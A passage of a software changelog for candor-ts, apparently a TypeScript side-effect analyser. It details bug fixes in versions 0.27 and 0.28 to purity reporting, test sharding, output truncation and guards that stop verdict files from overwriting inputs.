  own temp tree — so this changes how the suite runs, never what it asserts.

  Sharding lives in the script rather than a CI matrix on purpose: `ci.yml` runs `npm test` precisely
  so that a gate added locally cannot be silently missing from CI (the probe and mcp/watch suites once
  were), and this way the speedup reaches developers too.

  **`ci/shard-check.sh` is the correctness gate, and it earned itself twice.** It asserts the shards'
  pass totals SUM to the unsharded total, because a shard filter fails by silence: a block claimed by no
  shard does not error, it just never runs, and CI shows N green shards. (a) The first block-finder used
  a regex for a bare `{` at column 0 with backtick-parity tracking to skip fixture source. The parity
  desynced — backticks appear in comments and plain strings — and it found 96 real blocks and 79 in
  template literals where the truth is **175 real and none**. 79 blocks then ran in EVERY shard: 2,782
  assertions against 1,348. Now the block list is parsed with `ts.createSourceFile`. (b) A planted
  lost-block probe drops the total to 1,332 and reddens the gate.

  **And the thing shard-check could NOT see:** the first driver used `spawnSync` in a `map`, which
  blocks until each child exits — parallel by name, sequential by construction, measured at 289s against
  286s. The totals are identical either way, so only the clock catches it. Now `spawn` + `Promise.all`.
- **⚠ The F1 fix OVER-CHARGED function-scoped overloads — the exact failure it claimed to guard.** The
  last-write-wins delete mirrors `fns.set` only at MODULE level: a function-scoped unit carries a
  `#line:col` suffix, so each signature held a distinct key, the implementation's delete never reached
  them, and every signature was charged `Unknown[native:]` over code in the same file. `deny Unknown`
  flipped 0 → 1. The guard is now the SYMBOL, which every overload shares at any scope.

- **…and fixing that revealed a silent under-report older than this work.** The checker resolves a call
  to the SIGNATURE; function-scoped, that is a distinct empty unit, so a function calling a nested
  overloaded function that writes a file read PURE. The signature now EDGES to the implementation.

- **`answeredByLocalBody` saw only DIRECT overrides**, so one intermediate abstract class defeated the
  CHA exclusion — `Base → Mid → Impl` charged the base though the sole concrete implementation was
  analyzed. Now climbs transitively. Corpus deltas re-measured and unchanged.

- **`scratch.mjs` made the test harness UNKILLABLE.** Installing a signal listener replaces Node's
  default disposition, so `process.kill(process.pid, sig)` re-entered the handler forever — Ctrl-C swept,
  re-signalled, swept. `removeAllListeners` first. An uncaught throw also swept away the trees whose
  paths the crash had just printed.

- **`--agents` piped to an early-closing reader CRASHED.** The truncation fix introduced EPIPE: exit 1
  and a raw Node stack trace where the old path exited 0 silently. Swallowed, and EAGAIN (>64 KiB on a
  non-blocking pipe) now retries rather than throwing.

- **exit 2 is "could not evaluate", not a violation** — the self-gate reported the ⟨0.21⟩ fail-closed
  verdict as a red boundary. Found by review in the java arm; all three self-gates shared the collapse.

## [0.28.0] — 2026-08-14

- **A `scan.mjs` comment illustrating a refusal document** named the previous floor.

- **Self-gate (SPEC §7.12), and the first attempt would have proved nothing.** candor-ts was the one engine
  not gated by its own product. The first run analysed ONE file — `Cases.ts`, the test fixture — because
  the engine's own implementation is `.mjs` and that needs `--allow-js`: 38 functions, none of them the
  engine, and a verdict that reads like an answer. With the flag, 488 across 18 files. Two halves: the
  whole engine under `deny Net Db Ipc`, plus an assertion that the Exec units are exactly the three
  self-invocation sites. Falsified in all three directions.
- **The test harness sweeps its own fixture trees.** `project()` minted a temp tree per fixture and removed
  none — 45,280 `candor-ts-test-*` directories in `$TMPDIR`, ~1,300 per run, and a listing of `$TMPDIR` is
  what once made a `privacy-manifest --verify` take 72 seconds. `scratch.mjs` registers and sweeps on exit,
  including on SIGINT/SIGTERM, but KEEPS the trees when a run FAILED — a failing assertion prints a path
  into one of them. A passing run now leaks 0.
- **AGENTS.md points at the umbrella**, and the two verdict-spec assertions now derive the floor from
  `scan.mjs --version` rather than a literal.

- **⚠ CARDINAL SIN — a caller of a BODY-LESS LOCAL DECLARATION read PURE, and `deny Unknown` was green
  on it.** `localName` mints a unit for any declaration it can name and never asks whether that
  declaration has a BODY. An ambient `declare function`, any member of a local `.d.ts`, an `abstract`
  member no subclass overrides — each got a unit, the call site edged the caller to it, and the unit was
  EMPTY, so the caller unioned nothing and was certified pure. That is a purity claim over code the
  engine never saw. `deny Unknown` — the gate whose entire purpose is *fail if candor cannot see what
  this reaches* — exited **0** where candor-rust, candor-java and candor-swift all exit 1 on the same
  input. Now the declaration carries `Unknown` and the existing least-fixpoint carries it caller-ward.
  Pinned four-way by **conformance PART 46**, which reddens on ts alone with this fix reverted.

  FOUND ON REAL CODE by `candor/bin/corpus.sh`, and not reachable from any fixture anyone had thought to
  write: candor-ts's **entire report for `axios` is 54 `index.d.ts` declarations** while its 61 `.js`
  implementation files are never analyzed — `analyzed.count: 54` with `functions: []` and no
  `unanalyzed`, which is ⟨0.24⟩ **row 2**, the row that tells a consumer to believe the report and not
  hedge. THE SIBLING ROUTE: this same shape in a *dependency* has been pinned since the scan-boundary
  work (conformance PART 21, and this repo's own `boundary:` suite). Nobody asked it of the project's
  own source.

  REASON CLASSES follow §4's dividing line and the family's existing spellings — `native:<name>` for an
  ambient/`.d.ts` declaration (a boundary to code we cannot analyse, §4's definition verbatim; java
  spells the same shape `native:<method>`, rust `native:extern fn`), `dispatch:<owner>.<member>` for an
  `abstract` member, which is an unresolved dispatch with both halves nameable and swift's spelling for
  it. §4 makes the class per-language and best-effort, so this is the licensed use, not a new rung — no
  spec version moves.

  **THE OVER-CHARGE HALF, measured, because closing an under-report is exactly where fabrications get
  introduced.** A body-less declaration is charged only when NO LOCAL BODY ANSWERS IT: a base member with
  a local bodied override is already resolved by the class-CHA at the dispatch site, and charging the
  empty base too would manufacture uncertainty over code the engine can see. On the corpus that
  distinction is the whole difference — with it, **zod +0** (its one abstract, `ZodType._parse`, is
  overridden locally) and **hono +18 → +9**; without it, hono's `EventProcessor` (six abstracts, three
  local subclasses) and zod's would both have been charged. The nine that remain on hono are all true
  positives: `Deno.mkdir`/`writeFile` are Fs and `Deno.upgradeWebSocket`/`FetcherLike.fetch` are Net,
  all declared in local `.d.ts` shims with no body. Separately, the OVERLOAD SET is why the marker
  mirrors `fns.set`'s last-write-wins exactly — N body-less signatures precede the implementation under
  the same unit name, so a naive marker would call every overloaded function in every project
  unanalysable. Both controls are fixtures in `test.mjs`.

  RESIDUAL, stated because the axios headline invites over-reading it: this closes the *"candor cannot
  see"* channel, not the blindness itself. `deny Unknown` on axios now exits 1, but **`deny Net` still
  exits 0** — recovering that would mean analyzing the `.js` implementation, a different question.

- **`--agents` truncated the contract when stdout was a PIPE.** `printAgents` used `console.log` /
  `process.stdout.write` and scan.mjs called `process.exit(0)` on the next line, discarding Node's
  asynchronous stdout buffer: **8170 of 23121 characters**, cut mid-sentence, exit 0, nothing on stderr.
  An agent piping `candor-ts --agents` into its context silently read a third of its own instructions.
  Now a synchronous `fs.writeSync(1, …)` loop. The header on that function claimed one shared
  implementation "can never diverge within an install" and it was still wrong — query.mjs `break`s and
  drains on the way out, scan.mjs exits — so sharing the PRINTER did not share the EXIT. **The sibling
  route again**, in the caller the shared function existed to protect. Fixed in the printer, so the next
  caller inherits it. Only a pipe was affected, which is why a shell redirect to a file looked fine and
  only the suite's `execFileSync` ever saw it.

- **⟨0.28⟩ the MCP gate's ANDed boolean went silent on the PARTIAL case — `judgedNothing` is the ARRAY
  here too, and `noManifest` rides with it.** `candor_gate` emitted `judgedNothing: true|undefined` where
  SPEC §2 pins an array. The comment defending the boolean rested on one premise — *"this tool's document
  is ONE gate verdict about ONE locator"* — which the same file contradicts: `report` is a PREFIX
  (`DEFAULT_PREFIX`; `loadReportLoud`'s own message reads *"every report found at prefix … failed to
  load"*). One VERDICT is not one REPORT, which is precisely §2's reason for the array: *"a verb reading
  a prefix answers over many sibling reports, and WHICH of them judged nothing is the whole of the
  actionable content"*. It did not merely lose *which*: `loadGateReport` computes the flag as an AND over
  siblings, so the PARTIAL case — the common one — emitted `false` and therefore **no caveat at all**.
  MEASURED 2026-08-13 on a two-report prefix, one judged-nothing and one carrying a real function: the
  tool returned `{"ok":true,"violations":[]}`, silent, over a surface half of which was never judged — on
  the one channel whose consumer cannot ask a follow-up question. `noManifest` (SPEC §2 row 3) now rides
  with it for the reason that row exists; the `unverified` route in this same file already emitted both,
  and the gate route is its sibling that was never brought along. `ok` still consults neither key
  (⟨0.24⟩'s gate carve-out). The existing test asserted `judgedNothing === true` and now asserts the array
  NAMES the report — strictly stronger, since `=== true` passed for an engine that knew something was
  unjudged but not which.

- **⟨0.28⟩ the verdict document carries `ignored` — the policy lines the parse dropped** (SPEC §6.2,
  *"AND THE CONDITION IS A DROPPED LINE, NOT AN EMPTY POLICY"*). The zero-rule refusal fires only at ZERO
  survivors, so the discontinuity ran the wrong way: 0 of 10 rules parsing refused at exit 2, while 1 of
  10 wrote `{"ok": true, "violations": []}` at exit 0 and said nothing about the nine gates never asked —
  a 90%-gateless green, at every fraction below 100%. Measured here 2026-08-12: all four lines warned on
  stderr, both verdict documents silent. Refusal is the wrong remedy (it would break the
  forward-compatibility leniency §6.2 defends), so disclosure is: `ignored: [{line, text, reason}]` on
  the verdict, `line` 1-based over the normalized split, `text` the source line **verbatim** (before
  comment-stripping and trimming, unlike `unevaluated`'s `rule`), `reason` the same sentence stderr
  carries. **Both gate routes**, in the same position, pinned by a whole-document byte-equality row.
  Distinct from `unevaluated`, and the distinction is load-bearing: that key carries rules that PARSED
  and could not be answered, this carries text that never became a rule at all. Omitted when nothing was
  dropped, so a clean policy's verdict stays byte-identical; `ok` and every exit code ignore it. A FATAL
  policy error (a typo'd effect token) still refuses at exit 2 with `unevaluated` and no `ignored` — a
  refused run has no verdict for a dropped line to have shrunk. Built inside `parsePolicy`'s error
  recorder rather than as a second pass, and kept off `errors` itself so `parsepolicy`'s pinned witness
  shape is untouched. **Four routes**: both CLI gates, the MCP `candor_gate` tool — measured returning
  `{"ok":true,"violations":[]}` to an agent over a policy 3 of whose 4 lines were dropped, with the
  warnings on the *server's* stderr, a channel the agent never reads — and the LSP's live gate, where
  there is no document so the log channel carries the dropped lines with their line numbers (squiggles
  are that surface's entire vocabulary, so their absence reads as the whole gate).

- **⟨0.28⟩ a repeated `--out` is refused, with the fail-closed report at EVERY prefix named** (SPEC
  §3.3.1, *"AND A REPEATED `--out` IS THE SAME RULE — filed as an open question by the rung that wrote
  the sentence above, which is the tell"*). ⚠ Measured here 2026-08-12: `--out A --out B` took the LAST
  at exit 0, leaving `A.json` **byte-identical to the previous good run** — a stale green whose reader
  has no way to learn it lost, and a `gate --report A` over it answers from a scan that never ran. Now
  every distinct prefix named is ARMED (its previous §2 reports rewritten to the ⟨0.21⟩ Row-1 no-claim
  shape, §2.2 sidecars taken with them, the input exemption still asked per file) and the run exits 2;
  the exit precedes the scan, so the hand-back never runs and the placeholders STAND. A `--gate-json`
  file sink in the same argv holds its armed refusal, and the `--json` / `--gate-json -` streams carry
  their documents naming this cause. Two spellings of one prefix are ONE sink (`--out A --out ./A` from
  A's own directory) and are not refused; a single `--out` is unchanged. `allOutPrefixes` is one walk
  with `preScan`'s value rules, `preScan` keeping its `.last` — two walks is how the repeated form and
  the single form come to disagree about which tokens are prefixes at all.

- **⟨0.28⟩ an advisory verb over a configured ZERO-RULE policy answers with the caveat document**
  (SPEC §2, *"AND AN ADVISORY VERB OVER A ZERO-RULE POLICY ANSWERS THE SAME WAY"* + *"THE LIST OF
  ADVISORY VERBS IS ILLUSTRATIVE, NOT CLOSED — `fix` takes this too"*). §6.2 makes a configured policy
  that yields no rules an exit-2 refusal for the GATE; these four verbs share that loader and the rung
  did not touch them. Measured here 2026-08-12 over `# no rules yet`: `whatif` → `{…,"ok":true}`, `fix`
  → `{"crossing":false,"reason":"not-forbidden"}`, `fix-gate` → `{"ok":true,"remedies":[]}`,
  `unverified` → `{"ok":true,"unverified":[]}`, all exit 0 including `--strict`. *not-forbidden* by a
  policy that forbids nothing is vacuously true. They now emit the caveat document — `unevaluated`
  carrying one whole-policy entry, in the exact spelling this engine's own gate routes already use
  (`policyZeroRules`, one builder) — with the **result keys withheld** and the **exit unchanged**. `fix`
  emits **no `crossing` key**: present exactly when the verb answered. **All three surfaces**: the CLI,
  the MCP `candor_whatif`/`candor_fix`/`candor_unverified` tools, and the LSP, where the editor has no
  exit code and no JSON document so both channels collapse onto the log/message one — `✓ no policy rule
  fires` and `Net isn't forbidden here; no boundary fix needed` are the prose spelling of `ok: true`, and
  the live gate's silent squiggle-free editor is §6.2's harm where it is least visible. A policy that is
  NOT configured is untouched — that remains the honest way to say "I am not gating".

- **⟨0.28⟩ the third row is not the first row: `noManifest`** (SPEC §2, *"AND THE THIRD ROW IS NOT THE
  FIRST ROW — measured, two engines report it as one"*). Over `{"candor":{…},"functions":[]}` with no
  `analyzed` key at all, this engine listed the file under `judgedNothing` and its note said the report
  *"say[s] they JUDGED NOTHING (`analyzed.count: 0`)"* — measured here 2026-08-12. The report declares
  nothing. The hedge is the right direction (row 3's own instruction is *no manifest, no claim*) but the
  disclosure was false, and it holed ⟨0.28⟩'s own pin, which defines `judgedNothing` as *reports
  declaring `analyzed.count: 0`*. Row 3 now has its own pinned key `noManifest: ["<report path>", …]`,
  raising `incomplete` like the others and omitted when empty, on the answer documents, the Rung A caveat
  document, the advisory documents (`ok` withdrawn), the `baselineNoManifest` half of `gains`, and the
  MCP `candor_unverified` tool; the human notes get their own sentence, pointing at the repair that
  actually applies (a producer that emits a manifest, not a scan that reaches a conclusion). Row 1 keeps
  `judgedNothing` and **row 2 (`count: n>0`, `functions: []`) still does not hedge at all** — the control
  that makes the other two mean anything. The gate's own note already named all three conditions
  honestly and is unchanged.

- **⟨0.28⟩ the locator forms are pinned** (SPEC §3.1, *"AND HERE IS WHAT EACH LOCATOR FORM RESOLVES
  TO"*). No behaviour change — this engine was measured correct on all three — but three engines were
  found disagreeing invisibly, so the contract is now a row rather than an observation: a **FILE** locator
  resolves to that file and its §2.2 sidecars and never unions the prefix siblings beside it; a
  **PREFIX** resolves to the whole matching set, unioned, for the descriptive verbs as well as the gate;
  a **DIRECTORY** resolves to the reports discovered inside it. Each arm is pinned on both the
  descriptive and the gate route, and each was falsified against a mutant carrying the defect the other
  engines shipped.

- **⟨0.28⟩ Rung A: `show` and `map` emit the CAVEAT DOCUMENT instead of their result when hedging**
  (SPEC §2, *"A verb whose pinned shape cannot carry the caveat MUST emit the CAVEAT DOCUMENT INSTEAD
  of its result document"*). Not a result document with the caveat omitted, and not an empty result of
  the pinned shape. Measured here 2026-08-12 over a report declaring one `unanalyzed` unit: `show
  --json` answered its bare ARRAY with no caveat on any channel — the only descriptive verb of the
  seven with no completeness reader at all — and `map --json` MERGED the caveat keys into its module
  namespace, disclosing the collision loudly while still dropping the displaced row. Both now answer
  `{"incomplete": true, "unanalyzed"/"judgedNothing": …}` and nothing else on the hedge path. The
  `@`-prefix escape §2.2 uses for sidecars is unavailable and the ruling names this engine for why: an
  npm scoped package is `@scope/name`, so `@incomplete` is a key a real module could own. The type
  change is deliberate — a consumer doing `for (const x of doc)` gets a TypeError rather than a silent
  zero-iteration loop. `show` also gains the prose ⚠ INCOMPLETE note it never had, and its empty
  sentence stops citing the ⟨0.21⟩ purity convention over a report that cannot back it. **Both routes**:
  the CLI and the MCP `candor_show`/`candor_map` tools, the surface where an agent has no follow-up
  question available to it. Exits unchanged (0); the `map` collision warning is deleted because the
  condition it disclosed is no longer constructible. Healthy output byte-identical on both channels and
  both surfaces, diffed against the pre-change files.

- **⟨0.28⟩ the scan target expands to the files the run will PARSE** (SPEC §3.3.1, *"AND THE SCAN
  TARGET EXPANDS TO THE FILES THE RUN WILL PARSE"* — the residual the exact-artifact ruling
  deliberately left, and the clause names this engine's reproduction). ⚠ Measured live here
  2026-08-12: `candor-ts tsconfig.json --gate-json src/main.ts` armed the refusal verdict OVER the
  operator's source file, then reported the parse failure it had itself caused, and **exited 0** —
  unrecoverable loss of the operator's own code, published as success. Arming happens at parse time,
  before the file walk, so the set of files the run will read is not yet knowable; the check is the
  narrow one stated over what IS: **a sink that lies under the target and bears an extension this
  engine parses (`.ts/.tsx/.mts/.cts` and the `.js` family, which a tsconfig `allowJs` puts in the
  parse set) is refused at exit 2, having written nothing.** Never containment —
  `<target>/.candor/verdict.json` is under the target and is not source, so the recommended layout
  keeps gating for real, which is the control that separates this from the fix the ruling rejects
  (a containment rule was tried here once and "took 33 tests with it"). "Under the target" is under
  the target's ROOT DIR, computed by the same three-way test the run roots itself with — a tsconfig
  FILE target roots at its directory, which is exactly the measured spelling. Asked on the
  duplicate-`--gate-json` route as well, so a second sink cannot smuggle the refusal document over
  source the single-sink route refuses to touch.

- **⟨0.28⟩ a corrupt sibling report is disclosed as UNREADABLE, not `judgedNothing`** (SPEC §2's
  corruption-per-key-role ruling; the ⟨0.28⟩ caveat key set). Measured via candor-spec's key-shape
  harvest over an intact report with an unparseable `.dep` sibling under the same locator: rust and
  swift answered `incomplete: true` alone, while this engine listed the corrupt file under
  `judgedNothing` — a fabricated `analyzed.count: 0` claim about bytes nobody could read — and
  `reportUnanalyzed` skipped the same file with a bare `catch`. `reportCompleteness` now carries a
  third arm, `unreadable`, which raises `incomplete: true` with NO wire key of its own (the family
  shape) and names the file on the human channel with the true gate line (`gate --report` exits 2
  over a corrupt member, unlike count-0); `unverified`/`fix-gate`/`whatif` withdraw `ok` over it and
  keep their findings. The gate/MCP ANDed `reportJudgedNothing` keeps its fail-closed reading; the
  corrupt-ONLY locator still refuses loudly (exit 2). Exit codes unchanged — byte-verified old-vs-new
  over intact, armed and judged-nothing states across seven verbs and three `gains` pairings: zero
  diffs.

- **⟨0.28⟩ `gate --report`: the input guard covers what the locator EXPANDS to** (SPEC §3.3.1 (3),
  *"AND AN INPUT LOCATOR NAMES A SET — COMPARE THE EXPANSION, NEVER THE TOKEN"*). The guard compared
  `--gate-json` against the raw `--report` token while `loadGateReport` reads the token's expansion, so
  `gate --report r --policy P --gate-json r.json` destroyed the operator's report at exit 2 — measured,
  with the diagnostic blaming the report ("has no functions array") for the corruption the run
  inflicted — and the no-`--report` discovery spelling destroyed the discovered `.candor/report.json`
  identically. The §2.2 sidecars are covered too: `--gate-json <the callgraph>` wrote a REAL verdict
  over the pair's other half at exit 1, a success. `gateReportInputFiles` (query-core.mjs) enumerates
  the exact files by the loader's own `reportFilesAt` rule, kept adjacent so guard and loader cannot
  drift; `<stem>.gate.json` stays a permitted sink (the beside-the-report verdict layout), pinned by
  the control test.

- **⟨0.28⟩ the DESCRIPTIVE verbs carry the ⟨0.21⟩ completeness manifest too** (SPEC §2). The
  re-disclosure MUST was written over the instance it was found in — "a report-consuming verb whose
  VERDICT could change" — and ⟨0.28⟩ corrects it to the condition that makes it true: the obligation
  binds **any verb whose output could be read as a negative finding about the code — a verdict, an empty
  result set, or a zero count**. candor-ts implemented the narrow reading, so its six report-only verbs
  were never taught about it. MEASURED over the standard post-failure artifact (`analyzed.count: 0` plus
  a non-empty `unanalyzed` — what an armed run leaves on disk): `where Fs` →
  `{"directly":[],"inherited":[]}`, `map` → `{}`, `blindspots` → `{"sources":[],"totalUnknown":0}`,
  `reachable` → `{"entryPoints":0,"effects":{}}`, `containment` → `{"contained":[],"ambient":{}}`,
  `tour` → `{"reaches":[]}` — six flat all-clears at exit 0 with no hedge on either channel, one of them
  reporting *no blind spots* out of a report whose own manifest names a file candor could not read. A
  consumer cannot tell *nobody performs Fs* from *nothing was examined*. All six now add
  `"incomplete": true` (plus `unanalyzed` and/or `"judgedNothing": true`) to the same document and
  withdraw the reassuring sentence from the human arm, with the INCOMPLETE note above the answer — it
  qualifies a NON-empty result as much as an empty one. **Verdict-preserving: every exit code is
  unchanged in all 414 measured (state × verb × mode) cells.** The same caveat rides the five MCP tools
  (`candor_where`, `candor_map`, `candor_blindspots`, `candor_reachable`, `candor_containment`) — the
  agent is the consumer that cannot ask a follow-up question — and `containment <baseline>` folds in the
  BASELINE's manifest as well, since its answer is a difference and a partial baseline manufactures a
  leak at exit 1 exactly as a partial current tree hides one at exit 0.
  **The second cause was needed and absent:** `analyzed.count: 0` is read through the same
  `reportJudgedNothing` predicate `gate --report`, the MCP gate and the LSP already use, because a report
  that judged nothing carries no `unanalyzed` (there is no unread FILE to name) and a manifest-only
  reader sees it as complete. It reaches both DISCLOSURE channels and stops at the exit code — ⟨0.24⟩
  ruled that one explicitly ("a disclosure, not an exit code"), and the note says the opposite thing for
  each cause rather than sending the reader to a CI job that will pass. The advisory verbs (`unverified`,
  `fix-gate`, `whatif`) take the count-0 cause on their document and prose too — `unverified` was
  answering `{ok: true, unverified: []}` over a report that judged nothing — while both `--strict` exits
  stay keyed on the manifest alone. **Controls:** an INTACT report is byte-identical on both channels
  (no key, no note, no re-ordering); a report with `analyzed.count > 0` and `functions: []` is NOT
  hedged, because that is the all-pure claim §2 rule 3 requires a consumer to believe; and `map`'s
  top-level user namespace discloses a colliding module row by name rather than dropping it silently.
  `show` is deliberately NOT included: its document is a top-level JSON array with nowhere to hang a key,
  and fixing only its human channel would move the false all-clear rather than remove it — it needs a
  shape ruling, four-way.

- **⚠ ⟨0.28⟩ `impact` and `path` gate a BAD TARGET** (corpus-audit #3, conformance §17 (1b)). A
  nonexistent function answered `{"fn":"zzz","affectedCount":0,"affected":[],"entryPoints":[]}` and
  `{"effect":"Net","fn":"zzz","path":[]}` at **exit 0** — an authoritative all-clear about a question
  never posed. On the blast-radius verb `affectedCount: 0` is the strongest claim in the vocabulary
  ("nothing calls this, safe to change"), and a typo in a CI script or an agent's generated query read
  back as reassurance. Measured four-way on a valid report: rust exit 2 / exit 2, java exit 2 / exit 2,
  swift (no `impact` verb) / exit 2 — a one-engine divergence, and §17 (1b)'s comment already assumed it
  closed ("path/impact already gate"). Both verbs now exit 2 with `no function matching '<target>'`, on
  BOTH arms: `path`'s human arm always gated while `--json` — the arm a CI script and an agent read — did
  not, so the gate is hoisted above the JSON/human split rather than left on one route. The target
  resolves against the callgraph keys UNIONed with the report's fn names, the same set mcp.mjs's
  fn-existence guard uses, so the CLI and the MCP surface refuse the same names.
  **Three answers, not two**, and the separation is the point: *there is no call graph* keeps its
  ⟨0.28⟩ `unanswerable` document; *the graph says no* is still a determined negative at exit 0 (a fn that
  genuinely affects nothing still answers `affectedCount: 0`, one that genuinely does not reach an effect
  still answers `path: []` — withdrawing those to catch the fabricated one is the ⟨0.24⟩ count-0 mirror
  defect); *there is no such function* is the new stderr usage error, carrying no `unanswerable` key.
  Unchanged, and NOT part of this rung: a typo'd EFFECT on `path` (`path <real fn> Netwerk`) still exits
  0 with `path: []` — measured, that is what rust, java and swift all do, so gating it here would be a
  fresh one-engine divergence. Worth a four-way rung of its own, since `where` refuses the same typo.
- **⚠ ⟨0.28⟩ the §2.2 sidecars go with the armed report — deleted, not emptied** (SPEC §3.3.1). An armed
  report beside a LIVE `.callgraph`/`.hierarchy`/`.locs` is a pair that contradicts itself, and §2.2 gives
  the sidecar no provenance to arbitrate with. Not decorative: `callers`/`whatif`/`fix` are answered FROM
  the callgraph, because a currently-pure function is absent from the report by §2 rule 3. Measured on
  this engine — baseline `f` pure with caller `g`; the new version gives `f` an `fs.readFileSync` and adds
  caller `h`; the run exits 2 on an unknown flag — `callers f` answered exit 0 with `direct: [src.app.g]`,
  confident and wrong, and an agent reads that as safe-to-edit. `<stem>.gate.json` and `encountered-*` are
  NOT taken: a gate verdict is the verdict sink's own document. The sidecars follow only if the report
  write SUCCEEDED, and an orphan handed back by the ⟨0.28⟩ disarm brings its sidecars back with it.
  Conformance PART 37 (d) SKIP → PASS.
- **⚠ ⟨0.28⟩ `callers` discloses UNANSWERABLE in the machine channel** (SPEC §3.3.1). Deleting the
  sidecar with the armed report (above) removes the confidently WRONG answer; it does not by itself
  produce an honest one. `callers <f> --json` over an armed pair answered
  `{"of":[],"direct":[],"transitive":[]}` at exit 0 while the human arm said "no function in the call
  graph matches that name" — both determined negatives. A consumer reading `direct`, or defaulting it
  (the fail-open idiom ⟨0.24⟩ names on every key in this format), was told NOBODY CALLS this function:
  "safe to edit" over a pair whose honest answer is "this run judged nothing". Now
  `{"of": […], "unanswerable": "<why>"}` AND exit 2, in both channels and on the `--include-unknown`
  frontier arm too — §3.3.1 permits either, but the key alone still lets `d.direct ?? []` read as a
  determined negative and the exit alone leaves a JSON consumer holding an empty document (matching
  candor-rust `358e117` / candor-java `927252c`). **Only "no graph at all" is unanswerable**: a function
  with genuinely no callers over a complete graph still answers `direct: []` at exit 0, and a name absent
  from a real graph is still `no function matching` at exit 2 — three control rows pin that, so the fix
  cannot decay into `callers` refusing everything. The MCP `candor_callers` already failed closed here
  (`isError: true` from its fn-existence guard), measured rather than assumed.
  Conformance PART 37 (e) SKIP → PASS.
- **⚠ ⟨0.28⟩ `impact` and `path` discloses UNANSWERABLE too** (SPEC §3.3.1). The rung `callers` (above)
  measured on its two siblings and left open. Over the same armed pair, `impact <f>` answered
  `affectedCount: 0` and `path <f> <Effect>` answered `path: []`, both at **exit 0**, where candor-rust and
  candor-java exit 2 on both — a one-engine divergence against three arms. These are not report-only
  descriptive verbs: both resolve their TARGET over the §2.2 call graph, so with no sidecar every answer is
  vacuous, and each vacuum spells itself as exactly the reassurance the verb exists to give —
  `affectedCount: 0` is the blast-radius verb saying *nothing calls this, safe to change*, `path: []` is
  *there is no route by which this reaches that effect*. Now a document carrying `unanswerable` with the
  ANSWER keys OMITTED rather than zeroed (nothing left for a `d.affectedCount ?? 0` reader to mistake for a
  finding) AND exit 2, on both the `--json` and the human arm. `path`'s human arm is repaired, not merely
  forwarded: it exited 2 already but blamed the NAME ("no function matching 'f'") when the truth is about
  the graph, and over a VALID report with the sidecar gone it reached "does not perform Fs" /
  "not statically traceable" at exit 0. **Only "no graph at all" is unanswerable**: over a complete graph a
  function that genuinely affects nothing still answers `affectedCount: 0` and one that genuinely does not
  reach the effect still answers `path: []`, both at exit 0 — the graph SAID no, and withdrawing that is
  the ⟨0.24⟩ count-0 mirror defect. Five control rows pin it. MCP `candor_impact`/`candor_path` already
  failed closed (`isError: true`), measured rather than assumed. Conformance PART 5 `impact`/`path` shapes
  are untouched — the new key appears only on the branch with no graph.
- **⚠ ⟨0.28⟩ never reached the `gate --report` verb** (`query.mjs` has its own argv pre-pass, and the rung
  went into `scan.mjs` only). Measured: exit 1, red verdict at the last sink, a pre-seeded `{"ok": true}`
  untouched at the first. Conformance PART 36 (b21).
- **⚠ The input exemption took the whole run down**, leaving an innocent second sink publishing a previous
  run's green — and the stream zero bytes. Scoped to the offending path (b22). The duplicate case is now
  decided before the single-sink guards, which act on the last sink alone.
- The mostly-Unknown note on the QUERY route no longer names a build cause: `tour --report R` reads a
  report it did not produce, so "a missing tsconfig" was a guess about a build it never ran. Four-way, and
  PART 4l now pins the cause and not only the counts — which is how all four engines drifted there.

- **⚠ `--gate-json -` was left EMPTY by the `gate --report` route on an unreadable config**, while java and
  swift wrote the refusal. The ordering was the whole bug: `configDeclaredInputs()` — one of the §3.3.1
  collision checks — READS the config, and it ran before the stream hook was installed, so the earliest
  exit-2 cause there is exited through a hook that did not exist yet. The hook writes nothing until exit,
  so it is now installed first; the FILE arming stays behind the collision checks, because arming writes.
- **⟨0.28⟩ a repeated `--gate-json` is refused, and every path named gets the refusal** (SPEC §3.3.1). The
  first draft of this ran the input checks against the LAST sink only, so `--policy P --gate-json P
  --gate-json B` DESTROYED the policy while the other three engines kept it — a fix closing one channel by
  opening another, caught only because the check was run against all four engines rather than against
  itself. Every named sink now gets the same input checks.
- **The mostly-Unknown note names the cause that applies, not the usual one.** Found on a real Angular app:
  candor-ts reported "32 of 32 function(s) are Unknown … a missing tsconfig.json … are the usual cause"
  while `tsconfig.json` sat in the project root and that run had just read it — and two lines above, the
  same run had already named the real cause (seven `@angular/*` packages the classifier does not cover).
  The scan route now names the uncovered packages when they exist, rules the tsconfig out by name when one
  was read, and says so plainly when none was found; the query route stops guessing at a build it never
  saw. Pinned by conformance PART 4l.
## [0.27.0] — 2026-08-07








- **Two more exit-2 causes now reach the machine channel: an ENGINE PIN this build does not satisfy,
  and an EMPTY SCAN.** Both are ordinary CI accidents — a pin bumped ahead of the installed engine, a
  source path that moved — and §3.1 exempts no cause. Neither had a conformance row; measured before
  they did, the stream was empty for both here. Pinned by PART 36 (b16)/(b17).
- **⚠ A `--gate-json` sink INSIDE a `deps` DIRECTORY destroyed the operator's dep report.** `deps`
  accepts a directory — `--workspace` writes `.candor/deps/` and hands that back, so it is the common
  spelling — and the loader walks it and reads each report inside. The §3.3.1 sink-over-input guard
  registered only the DIRECTORY, which never equals a file within it, so `--gate-json <depdir>/lib.json`
  was unguarded: arming destroyed the report, the run chained the wreckage and exited 0 with `ok: true`
  written over the input. All four engines. The FILE spelling of this channel had been guarded for a
  release; the directory spelling had not, and no row posed it. Now pinned by conformance PART 36 (b14),
  which asserts both the refusal AND that nothing was written.
- **The config-unreadable cause reaches the stream too.** It is the EARLIEST exit-2 cause and the one
  the sink is least likely to be armed for, which is why it was the last one still leaving stdout empty
  after every other cause had been routed. Found by a conformance row written before the fix.
- **The NBSP dep-path fix reached the loader that actually loads deps.** `\s` in JS includes U+00A0, so
  a dep path holding a non-breaking space split into two halves. The CONFIG loader was fixed; the
  DEP-CHAIN loader — which every config-declared dep is also routed through — was not, so the same path
  java and rust load became a hard exit 2 here naming a truncated path the operator never wrote (harder
  than before, because ⟨0.27⟩ made an unresolvable dep token fatal). One rule, two spellings, and the
  entry claiming it fixed described only the first.
- **A config-driven exit no longer leaves a stale GREEN verdict at the file sink.** The collision
  pre-pass loads `.candor/config` inside a `try` under the comment "the real load refuses on its own
  terms" — which assumes the failure arrives as an exception. It does not: `loadCandorConfig` calls
  `process.exit(2)`, and a `catch` cannot intercept that, so an unreadable config killed the run before
  arming and left a previous run's `ok: true` on disk. SPEC §3.3 names that outcome exactly: "a refusal
  that writes nothing leaves the previous run's green document on disk"; java answers the same input
  with `refused: true`. The pre-pass now loads leniently. Nothing is lost — a config nobody can read
